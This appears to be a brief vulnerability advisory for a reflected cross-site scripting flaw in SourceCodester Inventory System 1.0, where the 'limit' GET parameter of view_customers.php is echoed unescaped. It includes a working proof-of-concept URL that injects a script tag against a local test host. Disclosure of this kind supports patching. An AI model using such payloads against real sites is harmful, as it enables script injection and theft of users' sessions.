# Reflected XSS in Inventory System (View Customers)
...
* **Version**: 1.0
* **Component**: View Customers (`view_customers.php`)
* **Vulnerable Parameter**: `limit` (GET)

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability exists in **SourceCodester Inventory System 1.0**. The vulnerability is located in the `view_customers.php` file.
...
```
http://127.0.0.1:8089/view_customers.php?limit=%22%3E%3Cscript%3Ealert(15623);%3C/script%3E
...
<img width="1179" height="656" alt="图片" src="https://github.com/user-attachments/assets/7952a36e-02b9-4b17-8f33-242b394fc7b3" />
